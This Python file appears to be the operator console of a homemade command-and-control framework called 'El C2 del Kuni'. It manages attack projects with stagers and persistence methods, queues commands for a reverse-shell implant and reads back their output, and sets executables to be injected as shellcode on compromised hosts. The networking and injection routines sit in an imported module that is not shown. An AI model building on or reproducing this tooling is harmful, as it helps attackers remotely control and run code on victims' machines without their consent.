from colorama import init, Fore, Back, Style
import functions
import json
import sys
import os
import xml.etree.ElementTree as ET

def console():
    try:
        x = input(Fore.BLUE + '\nC2> ' + Fore.WHITE)

        if x == 'new':
            project = functions.new()
            modules(project)

        if x == 'show':
            functions.show()
            console()

        if 'load' in x:
            keyword = 'load '
            before_keyword, keyword, project = x.partition(keyword)       
            if functions.load(project) == False:
                print('Couldn\'t find the project')
                console()
            modules(project)

        if x == 'exit':
            sys.exit(0)

    except KeyboardInterrupt:
        print('Interrupted by user')
        sys.exit(0)
    
def modules(project):
    try:
        print('Options:\r\n\r\nuse <module> - Select a module ( ReverseShell, Inject )\r\n')

        y = input(Fore.BLUE + 'C2:' + Fore.WHITE + project + Fore.BLUE + '> ' + Fore.WHITE)
    
        if 'use' in y:
            keyword = 'use '
            before_keyword, keyword, module = y.partition(keyword)
            if module == 'Inject':
                inject(project)
            if module == 'ReverseShell':
                tree = ET.parse('Projects/' + project + '/data.xml')
                root = tree.getroot()
                if root[3].text != 'Not persistant':
                    revshell(project)
                else:
                    print('Current stager doesnt support this module')
                    modules(project)

        if y == 'info':
            tree = ET.parse('Projects/' + project + '/data.xml')
            root = tree.getroot()
            print('Project name: ' + root[0].text)
            print('Creation date: ' + root[1].text)
            print('Stager type: ' + root[2].text)
            print('Persistant method: ' + root[3].text + '\n')
            modules(project)

        if y == 'exit':
            sys.exit(0)

        print('Incorrect option selected')
        modules(project)
    except KeyboardInterrupt:
        print('Interrupted by user')
        sys.exit(0)

def revshell(project):
    try:
        x = input(Fore.BLUE + 'C2:' + Fore.WHITE + project + '/ReverseShell' + Fore.BLUE + '> ' + Fore.WHITE)
        if x == 'exit':
            sys.exit(0)

        if x == 'clear':
            os.system('cls')
            revshell(project)

        if x == 'get history':
            functions.get_command_history(project)
            revshell(project)

        if x == 'get command':
            functions.get_command(project)
            revshell(project)

        if 'set command' in x:
            keyword = 'command '
            before_keyword, keyword, command = x.partition(keyword)
            command = command.encode('ascii')
            functions.set_command(command, project)
            revshell(project)

        if 'get output' in x:
            keyword = 'output '
            before_keyword, keyword, command = x.partition(keyword)
            functions.get_command_output(command, project)
            revshell(project)

        #if 'set rate' in x:
        #    keyword = 'output '
        #    before_keyword, keyword, rate = x.partition(keyword)
        #    functions.set_rate(rate)
        #    revshell(project)

        if 'use' in x:
            keyword = 'use '
            before_keyword, keyword, module = x.partition(keyword)
            if module == 'Inject':
                inject(project)

        if x == 'info':
            tree = ET.parse('Projects/' + project + '/data.xml')
            root = tree.getroot()
            print('Project name: ' + root[0].text)
            print('Creation date: ' + root[1].text)
            print('Stager type: ' + root[2].text)
            print('Persistant method: ' + root[3].text + '\n')
            revshell(project)

        if x == 'help':
            print('Commands:\r\nget command - Get next command on queue\nset command <command> - Set the command to run on the next execution\nget history - Get command history\nget output <command> - Get the output of a previously executed command\nuse <module> - Switch module\nhome - Exit the project\r\n')
            revshell(project)

        if x == 'home':
            console()

        print('Invalid command, type help to get a list of all the commands\r\n')
        revshell(project)

    except KeyboardInterrupt:
        print('Interrupted by user')
        sys.exit(0)

def inject(project):
    try:
        x = input(Fore.BLUE + 'C2:' + Fore.WHITE + project + '/Inject' + Fore.BLUE + '> ' + Fore.WHITE)
        if x == 'exit':
            sys.exit(0)

        if x == 'clear':
            os.system('cls')
            inject(project)

        if 'set shellcode' in x:
            keyword = 'shellcode '
            before_keyword, keyword, filename = x.partition(keyword)
            functions.set_shellcode(filename, project)
            inject(project)

        if x == "inject":
            functions.set_command('inject'.encode('ascii'), project)
            inject(project)

        if 'use' in x:
            keyword = 'use '
            before_keyword, keyword, module = x.partition(keyword)
            if module == 'ReverseShell':
                revshell(project)
        
        if x == 'info':
            tree = ET.parse('Projects/' + project + '/data.xml')
            root = tree.getroot()
            print('Project name: ' + root[0].text)
            print('Creation date: ' + root[1].text)
            print('Stager type: ' + root[2].text)
            print('Persistant method: ' + root[3].text + '\n')
            inject(project)

        if x == 'help':
            print('Commands:\r\nset shellcode <path to file> - select executable file to inject as shellcode\ninject - run injection on the next execution\nuse <module> - Switch module\nhome - exit the project\r\n')
            inject(project)

        if x == 'home':
            console()

        print('Invalid command, type help to get a list of all the commands\r\n')
        inject(project)

    except KeyboardInterrupt:
        print('Interrupted by user')
        sys.exit(0)

if __name__ == '__main__':
    os.system('cls')
    print(Fore.BLUE + 'El C2 del Kuni\r\n' + Fore.WHITE)
    print('Options:\r\n\r\nnew - Create a new project\nshow - Show all the proyect\nload <project> - Load a project\r')
    console()
